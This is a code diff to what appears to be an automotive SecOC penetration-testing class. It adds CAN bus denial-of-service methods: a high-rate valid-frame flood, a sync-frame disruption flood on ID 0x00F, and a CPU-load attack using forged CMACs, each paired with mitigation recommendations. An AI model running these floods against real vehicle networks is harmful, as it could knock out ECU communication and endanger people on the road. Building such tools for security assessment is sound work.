@@ -245,21 +245,21 @@ class SecOCAttacks:
         frame = self.engine.build_secoc_frame(
             old_trip, old_reset, current_fresh['message'], raw_data
         )
-        
+
         sent = self._send_frame(msg_id, raw_data, old_trip, old_reset, current_fresh['message'])
-        
+
         duration = time.time() - start_time
-        
+
         # Validate locally: True=accepted (defense failure), False=rejected (defense success)
         local_accepted = self.freshness.validate_freshness(
             old_trip, old_reset, current_fresh['message'], msg_id
         )
-        
+
         # Attack succeeds only if defense fails (receiver accepts old counter values)
         # local_accepted=True means defense failed (accepted old values) -> attack success
         # local_accepted=False means defense succeeded (rejected) -> attack failure
         attack_success = sent and local_accepted
-        
+
         return AttackResult(
             attack_name='Freshness Rollback',
             success=attack_success,
@@ -281,78 +281,215 @@ class SecOCAttacks:
             ]
         )
 
-    # === Attack 4: Bus-Off Induction ===
-
-    def busoff_induction(self, msg_id: int, duration: float = 5.0,
-                         rate: float = 100) -> AttackResult:
+    # === Attack 4: DoS Flood Attack (Replaces Bus-Off) ===
+    
+    def dos_flood_attack(self, msg_id: int, duration: float = 5.0,
+                         rate: float = 1000) -> AttackResult:
         """
-        Bus-Off Induction Attack - Force receiver into error state.
-
+        DoS Flood Attack - High-rate SecOC frame flood.
+        
+        Corrected design (original Bus-Off concept was wrong):
+        - SecOC auth failures do NOT cause CAN Bus-Off
+        - Instead, flood legitimate-looking frames to overwhelm receiver
+        
         Steps:
-        1. Send frames with invalid CMAC at high rate
-        2. Receiver detects authentication failure (form error equivalent)
-        3. After ~32 errors, receiver enters Bus-Off
-
+        1. Generate valid SecOC frames at high rate
+        2. Monopolize CAN bus bandwidth
+        3. Prevent legitimate ECUs from communicating
+        
         Args:
-            msg_id: CAN message ID to attack
+            msg_id: CAN message ID to flood
             duration: Attack duration (seconds)
-            rate: Frames per second
-
+            rate: Frames per second (max ~8000 for 500Kbps CAN)
+            
         Returns:
             AttackResult
         """
         start_time = time.time()
-
+        
         count = 0
-        errors = 0
-
         raw_data = b'\x00' * 8
-
+        
         while time.time() - start_time < duration:
-            # Generate random invalid CMAC
-            fake_cmac = random.randint(0, self.engine.cmac_mask)
-
-            # Get current freshness (to make frame look legitimate except CMAC)
             fresh = self.freshness.get_freshness(msg_id)
-
-            # Send with fake CMAC
+            
+            # Send valid SecOC frame (valid CMAC, valid freshness)
+            # This is more effective than invalid CMAC because:
+            # - Receiver must process and verify each frame
+            # - Wastes receiver CPU cycles
+            # - Monopolizes bus bandwidth
+            sent = self._send_frame(
+                msg_id, raw_data,
+                fresh['trip'], fresh['reset'], fresh['message']
+            )
+            
+            if sent:
+                count += 1
+            
+            time.sleep(1.0 / rate)
+        
+        actual_duration = time.time() - start_time
+        
+        # Calculate bus utilization
+        frame_bits = 128  # Approximate CAN frame size (with stuff bits)
+        bus_capacity = 500000  # 500 Kbps
+        max_frames_per_sec = bus_capacity / frame_bits  # ~3906 frames/sec
+        utilization = (count / actual_duration) / max_frames_per_sec
+        
+        return AttackResult(
+            attack_name='DoS Flood Attack',
+            success=utilization > 0.5,  # Success if >50% bus utilization
+            details={
+                'frames_sent': count,
+                'duration': actual_duration,
+                'rate': rate,
+                'actual_rate': count / actual_duration,
+                'bus_utilization': f"{utilization * 100:.1f}%",
+                'max_frames_per_sec': max_frames_per_sec
+            },
+            duration=actual_duration,
+            risk_level='HIGH',
+            recommendations=[
+                'Implement CAN bus rate limiting per ECU',
+                'Add SecOC frame rate monitoring',
+                'Implement burst detection and throttling',
+                'Consider separate CAN bus for critical vs non-critical traffic'
+            ]
+        )
+    
+    def sync_disruption_attack(self, msg_id: int = 0x00F,
+                               disruption_duration: float = 2.0) -> AttackResult:
+        """
+        Sync Disruption Attack - Block CGW1G01 sync frames.
+        
+        Strategy:
+        1. Send high-priority frames to block sync frame transmission
+        2. Without sync, all SecOC receivers eventually reject messages
+        3. Results in DoS without violating any protocol
+        
+        Args:
+            msg_id: Sync message ID (default 0x00F for CGW1G01)
+            disruption_duration: Duration of disruption
+            
+        Returns:
+            AttackResult
+        """
+        start_time = time.time()
+        
+        count = 0
+        raw_data = b'\xFF' * 8  # High-priority data pattern
+        
+        # Send frames with same or higher priority than sync frame
+        while time.time() - start_time < disruption_duration:
+            msg = CANMessage(arbitration_id=msg_id, data=raw_data)
+            if self.can_driver.send(msg):
+                count += 1
+            time.sleep(0.0001)  # 10K fps burst
+        
+        actual_duration = time.time() - start_time
+        
+        return AttackResult(
+            attack_name='Sync Disruption Attack',
+            success=count > 1000,
+            details={
+                'frames_sent': count,
+                'duration': actual_duration,
+                'target': f"0x{msg_id:03X} (CGW1G01 sync)",
+                'effect': 'Blocks sync frame, causes freshness timeout in receivers',
+                'expected_result': 'All SecOC nodes stop accepting messages after freshness timeout'
+            },
+            duration=actual_duration,
+            risk_level='HIGH',
+            recommendations=[
+                'Implement redundant sync channels',
+                'Add sync frame timeout detection with fallback',
+                'Use time-based freshness as backup (TripCounter monotonic)',
+                'Monitor sync frame arrival rate'
+            ]
+        )
+    
+    def cpu_load_attack(self, msg_id: int, duration: float = 5.0,
+                        rate: float = 500) -> AttackResult:
+        """
+        CPU Load Attack - Force receiver to spend cycles verifying frames.
+        
+        Strategy:
+        1. Send frames with valid-looking structure but invalid CMAC
+        2. Receiver must process full CMAC verification before rejection
+        3. High rate of verification failures wastes CPU
+        
+        Args:
+            msg_id: CAN message ID
+            duration: Attack duration
+            rate: Frames per second
+            
+        Returns:
+            AttackResult
+        """
+        start_time = time.time()
+        
+        count = 0
+        raw_data = b'\x00' * 8
+        
+        while time.time() - start_time < duration:
+            fresh = self.freshness.get_freshness(msg_id)
+            
+            # Generate valid-looking but incorrect CMAC
+            # This forces receiver to do full AES-CMAC computation
+            fake_cmac = random.randint(0, self.engine.cmac_mask)
+            
             sent = self._send_frame(
                 msg_id, raw_data,
                 fresh['trip'], fresh['reset'], fresh['message'],
                 override_cmac=fake_cmac
             )
-
+            
             if sent:
                 count += 1
-
-            # Small delay to maintain rate
+            
             time.sleep(1.0 / rate)
-
+        
         actual_duration = time.time() - start_time
-
-        # CAN error passive after 128 errors, Bus-Off after 256 errors (128 TEC + 128 REC)
-        # But with SecOC auth failures, it's similar to form error accumulation
-        expected_busoff = count >= 32  # Simplified: ~32 errors for Bus-Off
-
+        
+        # Estimate CPU impact
+        # AES-CMAC ~1000 cycles per verification
+        # 500 fps * 1000 cycles = 500K cycles/sec
+        # On 100MHz MCU, that's 0.5% CPU per attacked message type
+        # But if multiple message types attacked simultaneously, impact multiplies
+        estimated_cpu_impact = (count / actual_duration) * 0.001  # 0.1% per 100fps
+        
         return AttackResult(
-            attack_name='Bus-Off Induction',
-            success=expected_busoff,
+            attack_name='CPU Load Attack',
+            success=estimated_cpu_impact > 1.0,  # >1% CPU impact
             details={
                 'frames_sent': count,
                 'duration': actual_duration,
                 'rate': rate,
-                'expected_busoff_threshold': 32,
-                'expected_busoff': expected_busoff
+                'estimated_cpu_impact': f"{estimated_cpu_impact:.2f}%",
+                'attack_type': 'Forced CMAC verification (computation DoS)',
+                'mitigation': 'Early rejection on freshness check before CMAC'
             },
             duration=actual_duration,
-            risk_level='HIGH',
+            risk_level='MEDIUM',
             recommendations=[
-                'Implement Bus-Off recovery with Freshness reset',
-                'Monitor TEC (Transmit Error Counter) on receiving ECU',
-                'Add rate limiting for authentication failure responses',
-                'Consider SecOC error handling without Bus-Off'
+                'Implement early freshness check before CMAC verification',
+                'Add rate limiting per message ID',
+                'Monitor CPU load and throttle verification',
+                'Cache recent verification results'
             ]
         )
+    
+    # Legacy Bus-Off method - deprecated, redirects to DoS
+    def busoff_induction(self, msg_id: int, duration: float = 5.0,
+                         rate: float = 100) -> AttackResult:
+        """
+        DEPRECATED: Bus-Off Induction concept was incorrect.
+        
+        SecOC authentication failures do NOT cause CAN Bus-Off.
+        This method now redirects to DoS Flood Attack.
+        """
+        logger.warning("busoff_induction() is deprecated. Use dos_flood_attack() instead.")
+        return self.dos_flood_attack(msg_id, duration, rate)
 
     # === Attack 5: Key Update Interception ===
 
